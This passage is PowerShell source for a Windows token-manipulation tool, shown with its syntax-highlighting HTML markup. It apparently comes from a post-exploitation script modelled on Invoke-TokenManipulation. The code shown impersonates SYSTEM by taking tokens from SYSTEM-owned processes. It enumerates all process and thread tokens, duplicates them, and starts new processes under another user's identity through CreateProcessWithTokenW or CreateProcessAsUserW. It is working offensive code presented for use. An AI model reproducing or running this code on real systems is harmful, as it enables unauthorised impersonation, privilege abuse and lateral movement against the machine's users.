TokenByAvailablePriv = <span class="token variable">$TokenByAvailablePriv</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> PSObject <span class="token operator">-</span>Property <span class="token variable">$ReturnDict</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Invoke<span class="token operator">-</span>ImpersonateUser    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>            <span class="token namespace">[IntPtr]</span>            <span class="token variable">$hToken</span>        <span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Duplicate the token so it can be used to create a new process</span>        <span class="token namespace">[IntPtr]</span><span class="token variable">$NewHToken</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token variable">$Success</span> = <span class="token variable">$DuplicateTokenEx</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>MAXIMUM_ALLOWED<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> 3<span class="token punctuation">,</span> 1<span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$NewHToken</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#todo does this need to be freed</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token function">Write-Warning</span> <span class="token string">"DuplicateTokenEx failed. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token variable">$Success</span> = <span class="token variable">$ImpersonateLoggedOnUser</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$NewHToken</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$Errorcode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token function">Write-Warning</span> <span class="token string">"Failed to ImpersonateLoggedOnUser. Error code: <span class="token variable">$Errorcode</span>"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$Success</span> = <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$NewHToken</span><span class="token punctuation">)</span>        <span class="token variable">$NewHToken</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token function">Write-Warning</span> <span class="token string">"CloseHandle failed to close NewHToken. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$Success</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Create<span class="token operator">-</span>ProcessWithToken    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>            <span class="token namespace">[IntPtr]</span>            <span class="token variable">$hToken</span><span class="token punctuation">,</span>            <span class="token namespace">[Parameter(Position=1, Mandatory=$true)]</span>            <span class="token namespace">[String]</span>            <span class="token variable">$ProcessName</span><span class="token punctuation">,</span>            <span class="token namespace">[Parameter(Position=2)]</span>            <span class="token namespace">[String]</span>            <span class="token variable">$ProcessArgs</span><span class="token punctuation">,</span>            <span class="token namespace">[Parameter(Position=3)]</span>            <span class="token namespace">[Switch]</span>            <span class="token variable">$PassThru</span>        <span class="token punctuation">)</span>        <span class="token function">Write-Verbose</span> <span class="token string">"Entering Create-ProcessWithToken"</span>        <span class="token comment" spellcheck="true">#Duplicate the token so it can be used to create a new process</span>        <span class="token namespace">[IntPtr]</span><span class="token variable">$NewHToken</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token variable">$Success</span> = <span class="token variable">$DuplicateTokenEx</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>MAXIMUM_ALLOWED<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> 3<span class="token punctuation">,</span> 1<span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$NewHToken</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token function">Write-Warning</span> <span class="token string">"DuplicateTokenEx failed. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token variable">$StartupInfoSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$STARTUPINFO</span><span class="token punctuation">)</span>            <span class="token namespace">[IntPtr]</span><span class="token variable">$StartupInfoPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$StartupInfoSize</span><span class="token punctuation">)</span>            <span class="token variable">$memset</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$StartupInfoPtr</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$StartupInfoSize</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::WriteInt32<span class="token punctuation">(</span><span class="token variable">$StartupInfoPtr</span><span class="token punctuation">,</span> <span class="token variable">$StartupInfoSize</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#The first parameter (cb) is a DWORD which is the size of the struct</span>            <span class="token variable">$ProcessInfoSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$PROCESS_INFORMATION</span><span class="token punctuation">)</span>            <span class="token namespace">[IntPtr]</span><span class="token variable">$ProcessInfoPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$ProcessInfoSize</span><span class="token punctuation">)</span>            <span class="token variable">$ProcessNamePtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::StringToHGlobalUni<span class="token punctuation">(</span><span class="token string">"<span class="token variable">$ProcessName</span>"</span><span class="token punctuation">)</span>            <span class="token variable">$ProcessArgsPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token namespace">[String]</span>::IsNullOrEmpty<span class="token punctuation">(</span><span class="token variable">$ProcessArgs</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$ProcessArgsPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::StringToHGlobalUni<span class="token punctuation">(</span><span class="token string">"`"<span class="token variable">$ProcessName</span>`" <span class="token variable">$ProcessArgs</span>"</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token variable">$FunctionName</span> = <span class="token string">""</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token namespace">[System.Diagnostics.Process]</span>::GetCurrentProcess<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SessionId <span class="token operator">-eq</span> 0<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">#Cannot use CreateProcessWithTokenW when in Session0 because CreateProcessWithTokenW throws an ACCESS_DENIED error. I believe it is because</span>                <span class="token comment" spellcheck="true">#this API attempts to modify the desktop ACL. I would just use this API all the time, but it requires that I enable SeAssignPrimaryTokenPrivilege</span>                <span class="token comment" spellcheck="true">#which is not ideal. </span>                <span class="token function">Write-Verbose</span> <span class="token string">"Running in Session 0. Enabling SeAssignPrimaryTokenPrivilege and calling CreateProcessAsUserW to create a process with alternate token."</span>                Enable<span class="token operator">-</span>Privilege <span class="token operator">-</span>Privilege SeAssignPrimaryTokenPrivilege                <span class="token variable">$Success</span> = <span class="token variable">$CreateProcessAsUserW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$NewHToken</span><span class="token punctuation">,</span> <span class="token variable">$ProcessNamePtr</span><span class="token punctuation">,</span> <span class="token variable">$ProcessArgsPtr</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$StartupInfoPtr</span><span class="token punctuation">,</span> <span class="token variable">$ProcessInfoPtr</span><span class="token punctuation">)</span>                <span class="token variable">$FunctionName</span> = <span class="token string">"CreateProcessAsUserW"</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Verbose</span> <span class="token string">"Not running in Session 0, calling CreateProcessWithTokenW to create a process with alternate token."</span>                <span class="token variable">$Success</span> = <span class="token variable">$CreateProcessWithTokenW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$NewHToken</span><span class="token punctuation">,</span> 0x0<span class="token punctuation">,</span> <span class="token variable">$ProcessNamePtr</span><span class="token punctuation">,</span> <span class="token variable">$ProcessArgsPtr</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$StartupInfoPtr</span><span class="token punctuation">,</span> <span class="token variable">$ProcessInfoPtr</span><span class="token punctuation">)</span>                <span class="token variable">$FunctionName</span> = <span class="token string">"CreateProcessWithTokenW"</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Success</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">#Free the handles returned in the ProcessInfo structure</span>                <span class="token variable">$ProcessInfo</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$ProcessInfoPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$PROCESS_INFORMATION</span><span class="token punctuation">)</span>                <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hProcess<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>                <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hThread<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>        <span class="token comment" spellcheck="true">#Pass created System.Diagnostics.Process object to pipeline</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PassThru</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">#Retrieving created System.Diagnostics.Process object</span>            <span class="token variable">$returnProcess</span> = <span class="token function">Get-Process</span> <span class="token operator">-</span>Id <span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>dwProcessId            <span class="token comment" spellcheck="true">#Caching process handle so we don't lose it when the process exits</span>            <span class="token variable">$null</span> = <span class="token variable">$returnProcess</span><span class="token punctuation">.</span>Handle            <span class="token comment" spellcheck="true">#Passing System.Diagnostics.Process object to pipeline</span>            <span class="token variable">$returnProcess</span>        <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token function">Write-Warning</span> <span class="token string">"<span class="token variable">$FunctionName</span> failed. Error code: <span class="token variable">$ErrorCode</span>"</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">#Free StartupInfo memory and ProcessInfo memory</span>            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$StartupInfoPtr</span><span class="token punctuation">)</span>            <span class="token variable">$StartupInfoPtr</span> = <span class="token namespace">[Intptr]</span>::Zero            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$ProcessInfoPtr</span><span class="token punctuation">)</span>            <span class="token variable">$ProcessInfoPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::ZeroFreeGlobalAllocUnicode<span class="token punctuation">(</span><span class="token variable">$ProcessNamePtr</span><span class="token punctuation">)</span>            <span class="token variable">$ProcessNamePtr</span> = <span class="token namespace">[IntPtr]</span>::Zero            <span class="token comment" spellcheck="true">#Close handle for the token duplicated with DuplicateTokenEx</span>            <span class="token variable">$Success</span> = <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$NewHToken</span><span class="token punctuation">)</span>            <span class="token variable">$NewHToken</span> = <span class="token namespace">[IntPtr]</span>::Zero            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token function">Write-Warning</span> <span class="token string">"CloseHandle failed to close NewHToken. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Free<span class="token operator">-</span>AllTokens    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>            <span class="token namespace">[PSObject[]</span><span class="token punctuation">]</span>            <span class="token variable">$TokenInfoObjs</span>        <span class="token punctuation">)</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Obj</span> in <span class="token variable">$TokenInfoObjs</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$Success</span> = <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$Obj</span><span class="token punctuation">.</span>hToken<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token function">Write-Verbose</span> <span class="token string">"Failed to close token handle in Free-AllTokens. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>            <span class="token punctuation">}</span>            <span class="token variable">$Obj</span><span class="token punctuation">.</span>hToken = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#Enumerate all tokens on the system. Returns an array of objects with the token and information about the token.</span>    <span class="token keyword">function</span> Enum<span class="token operator">-</span>AllTokens    <span class="token punctuation">{</span>        <span class="token variable">$AllTokens</span> = @<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.</span>        <span class="token comment" spellcheck="true">#Even if already running as system, later parts on the script depend on having a SYSTEM token with most privileges.</span>        <span class="token comment" spellcheck="true">#We need to enumrate all processes running as SYSTEM and find one that we can use.</span>        <span class="token namespace">[string]</span><span class="token variable">$LocalSystemNTAccount</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> <span class="token operator">-</span>TypeName <span class="token string">'System.Security.Principal.SecurityIdentifier'</span> <span class="token operator">-</span>ArgumentList <span class="token punctuation">(</span><span class="token namespace">[Security.Principal.WellKnownSidType]</span>::<span class="token string">'LocalSystemSid'</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Translate<span class="token punctuation">(</span><span class="token namespace">[Security.Principal.NTAccount]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Value        <span class="token variable">$SystemTokens</span> = <span class="token function">Get-WmiObject</span> <span class="token operator">-</span><span class="token keyword">Class</span> Win32_Process <span class="token punctuation">|</span> <span class="token function">ForEach-Object</span> <span class="token punctuation">{</span>            <span class="token variable">$OwnerInfo</span> = <span class="token variable">$_</span><span class="token punctuation">.</span>GetOwner<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$OwnerInfo</span><span class="token punctuation">.</span>Domain <span class="token operator">-and</span> <span class="token variable">$OwnerInfo</span><span class="token punctuation">.</span>User<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$OwnerString</span> = <span class="token string"><span class="token function">"$<span class="token punctuation">(</span><span class="token variable">$OwnerInfo</span><span class="token punctuation">.</span>Domain<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token variable">$OwnerInfo</span><span class="token punctuation">.</span>User<span class="token punctuation">)</span></span>"</span><span class="token punctuation">.</span>ToUpper<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$OwnerString</span> <span class="token operator">-eq</span> <span class="token variable">$LocalSystemNTAccount</span><span class="token punctuation">.</span>ToUpper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$_</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">ForEach</span> <span class="token punctuation">(</span><span class="token variable">$SystemToken</span> in <span class="token variable">$SystemTokens</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$SystemTokenInfo</span> = Get<span class="token operator">-</span>PrimaryToken <span class="token operator">-</span>ProcessId <span class="token variable">$SystemToken</span><span class="token punctuation">.</span>ProcessId <span class="token operator">-</span>WarningAction SilentlyContinue <span class="token operator">-</span>ErrorAction SilentlyContinue            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SystemTokenInfo</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">break</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SystemTokenInfo</span> <span class="token operator">-eq</span> <span class="token variable">$null</span> <span class="token operator">-or</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token punctuation">(</span>Invoke<span class="token operator">-</span>ImpersonateUser <span class="token operator">-</span>hToken <span class="token variable">$systemTokenInfo</span><span class="token punctuation">.</span>hProcToken<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">Write-Warning</span> <span class="token string">"Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SystemTokenInfo</span> <span class="token operator">-ne</span> <span class="token variable">$null</span> <span class="token operator">-and</span> <span class="token variable">$SystemTokenInfo</span><span class="token punctuation">.</span>hProcToken <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$SystemTokenInfo</span><span class="token punctuation">.</span>hProcToken<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>            <span class="token variable">$SystemTokenInfo</span> = <span class="token variable">$null</span>        <span class="token punctuation">}</span>        <span class="token variable">$ProcessIds</span> = <span class="token function">get-process</span> <span class="token punctuation">|</span> where <span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">.</span>name <span class="token operator">-</span>inotmatch <span class="token string">"^csrss$"</span> <span class="token operator">-and</span> <span class="token variable">$_</span><span class="token punctuation">.</span>name <span class="token operator">-</span>inotmatch <span class="token string">"^system$"</span> <span class="token operator">-and</span> <span class="token variable">$_</span><span class="token punctuation">.</span>id <span class="token operator">-ne</span> 0<span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#Get all tokens</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Process</span> in <span class="token variable">$ProcessIds</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$PrimaryTokenInfo</span> = <span class="token punctuation">(</span>Get<span class="token operator">-</span>PrimaryToken <span class="token operator">-</span>ProcessId <span class="token variable">$Process</span><span class="token punctuation">.</span>Id <span class="token operator">-</span>FullPrivs<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#If a process is a protected process, it's primary token cannot be obtained. Don't try to enumerate it.</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PrimaryTokenInfo</span> <span class="token operator">-ne</span> <span class="token variable">$null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token namespace">[IntPtr]</span><span class="token variable">$hToken</span> = <span class="token namespace">[IntPtr]</span><span class="token variable">$PrimaryTokenInfo</span><span class="token punctuation">.</span>hProcToken                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hToken</span> <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">#Get the LUID corrosponding to the logon</span>                    <span class="token variable">$ReturnObj</span> = Get<span class="token operator">-</span>TokenInformation <span class="token operator">-</span>hToken <span class="token variable">$hToken</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ReturnObj</span> <span class="token operator">-ne</span> <span class="token variable">$null</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span>MemberType NoteProperty <span class="token operator">-</span>Name ProcessId <span class="token operator">-</span>Value <span class="token variable">$Process</span><span class="token punctuation">.</span>Id                        <span class="token variable">$AllTokens</span> <span class="token operator">+=</span> <span class="token variable">$ReturnObj</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    <span class="token function">Write-Warning</span> <span class="token string">"Couldn't retrieve token for Process:<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$Process</span><span class="token punctuation">.</span>Name<span class="token punctuation">)</span></span>. ProcessId:<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$Process</span><span class="token punctuation">.</span>Id<span class="token punctuation">)</span></span>"</span>                <span class="token punctuation">}</span>                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Thread</span> in <span class="token variable">$Process</span><span class="token punctuation">.</span>Threads<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token variable">$ThreadTokenInfo</span> = Get<span class="token operator">-</span>ThreadToken <span class="token operator">-</span>ThreadId <span class="token variable">$Thread</span><span class="token punctuation">.</span>Id                    <span class="token namespace">[IntPtr]</span><span class="token variable">$hToken</span> = <span class="token punctuation">(</span><span class="token variable">$ThreadTokenInfo</span><span class="token punctuation">.</span>hThreadToken<span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hToken</span> <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$ReturnObj</span> = Get<span class="token operator">-</span>TokenInformation <span class="token operator">-</span>hToken <span class="token variable">$hToken</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ReturnObj</span> <span class="token operator">-ne</span> <span class="token variable">$null</span><span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span>MemberType NoteProperty <span class="token operator">-</span>Name ThreadId <span class="token operator">-</span>Value <span class="token variable">$Thread</span><span class="token punctuation">.</span>Id                            <span class="token variable">$AllTokens</span> <span class="token operator">+=</span> <span class="token variable">$ReturnObj</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$AllTokens</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Invoke<span class="token operator">-</span>RevertToSelf    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>            <span class="token namespace">[Parameter(Position=0)]</span>            <span class="token namespace">[Switch]</span>            <span class="token variable">$ShowOutput</span>        <span class="token punctuation">)</span>        <span class="token variable">$Success</span> = <span class="token variable">$RevertToSelf</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ShowOutput</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Success</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Output</span> <span class="token string">"RevertToSelf was successful. Running as:<span class="token function"> $<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserDomainName<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserName<span class="token punctuation">)</span></span>"</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Output</span> <span class="token string">"RevertToSelf failed. Running as:<span class="token function"> $<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserDomainName<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserName<span class="token punctuation">)</span></span>"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#Main function</span>    <span class="token keyword">function</span> Main    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token punctuation">(</span><span class="token namespace">[Security.Principal.WindowsPrincipal]</span> <span class="token namespace">[Security.Principal.WindowsIdentity]</span>::GetCurrent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>IsInRole<span class="token punctuation">(</span><span class="token namespace">[Security.Principal.WindowsBuiltInRole]</span> <span class="token string">"Administrator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">Write-Error</span> <span class="token string">"Script must be run as administrator"</span> <span class="token operator">-</span>ErrorAction Stop        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#If running in session 0, force NoUI</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token namespace">[System.Diagnostics.Process]</span>::GetCurrentProcess<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SessionId <span class="token operator">-eq</span> 0<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">Write-Verbose</span> <span class="token string">"Running in Session 0, forcing NoUI (processes in Session 0 cannot have a UI)"</span>            <span class="token variable">$NoUI</span> = <span class="token boolean">$true</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"RevToSelf"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Invoke<span class="token operator">-</span>RevertToSelf <span class="token operator">-</span>ShowOutput        <span class="token 